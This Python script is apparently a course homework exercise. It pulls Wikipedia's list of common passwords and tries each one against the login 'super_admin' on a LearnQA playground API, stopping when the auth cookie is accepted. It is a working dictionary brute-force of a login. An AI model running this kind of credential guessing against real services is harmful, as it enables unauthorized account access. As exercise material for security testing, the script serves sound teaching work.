import requests
from bs4 import BeautifulSoup
import lxml

url_take_cookie = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
url_check_cookie = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
url_for_parsed_psswd = "https://en.wikipedia.org/wiki/List_of_the_most_common_passwords"


def take_cookie(login):
    passwords = requests.get(url_for_parsed_psswd)
    soup = BeautifulSoup(passwords.text, 'lxml')
    parsed_passwords = soup.find_all("td")
    set_passwd = {word.text.strip() for word in parsed_passwords}
    for password in set_passwd:
        params = {'login': login, 'password': password}
        response = requests.post(url_take_cookie, data=params)
        cookie_value = response.cookies.get("auth_cookie")
        if check_cookie(cookie_value) == "You are authorized":
            print(check_cookie(cookie_value))
            return params
    print("Password not found")


def check_cookie(cookie_value):
    cookie_for_check = {'auth_cookie': cookie_value}
    response = requests.post(url_check_cookie, cookies=cookie_for_check)
    return response.text


if __name__ == "__main__":
    personal_login = "super_admin"
    print(take_cookie(personal_login))
